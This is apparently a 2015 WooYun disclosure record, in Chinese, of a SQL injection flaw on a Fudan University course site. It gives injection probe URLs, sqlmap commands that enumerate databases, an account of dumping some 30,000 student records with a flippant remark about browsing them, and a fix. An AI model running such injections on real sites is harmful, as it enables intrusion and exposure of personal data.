{"id": 28987, "wybug_id": "wooyun-2015-0120752", "wybug_title": "复旦大学某子站SQL注入漏洞", "wybug_corp": "复旦大学", "wybug_author": "路人甲", "wybug_date": "2015-06-16 13:59", "wybug_open_date": "2015-07-31 14:42", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "已交由第三方合作机构(CCERT教育网应急响应组)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-31：\t细节向公众公开  简要描述： 复旦大学某子网站未对参数过滤导致SQL注入漏洞，可获得全校3万多学生信息 详细说明：  0x01:打开复旦大学核心课程网http://hexin.fudan.edu.cn/index.php，找了几个URL实验名没有什么结果，偶然打开首页某框架URL：\nhttp://hexin.fudan.edu.cn/coursetype.php?type=5&term=4\n并尝试构造：\nhttp://hexin.fudan.edu.cn/coursetype.php?type=6-1&term=4\n发现可以成功打开并且页面内容相同。显然这是一个int型参数，SQL语句中没有加引号。\n\n\n\n加分号继续尝试，期望应该是报错：\nhttp://hexin.fudan.edu.cn/coursetype.php?type=5%27&term=4\n\n\n果然显示错误信息。基本确定注入点。0x02:于是简便起见，直接扔sqlmap：\nsqlmap.py -u \"http://hexin.fudan.edu.cn/coursetype.php?type=5&term=4\" --dbs\n跑出库为course\nsqlmap.py -u \"http://hexin.fudan.edu.cn/coursetype.php?type=5&term=4\" --tables -D course --threads 4\n可以列出所有的表：\n\n好吧，好多。。挑了一个studentdb拖下来有三万多条数据...躺枪\n\n随手挑了部分妹纸（手动斜眼笑）   漏洞证明：  \n\n\n\n   修复方案：  int型强制转换一下(intval就行)，字符串转义。或PDO以及其他自行开脑洞的过滤。PS：复旦漏洞其实还好多，信息办该一块审计一下代码，好多奇奇怪怪的子域（特指那些用Access的）都是有注入的，虽然注入了也没什么卵用。PS:求不查水表   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2015-06-16 14:40 厂商回复： 通知用户处理中 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}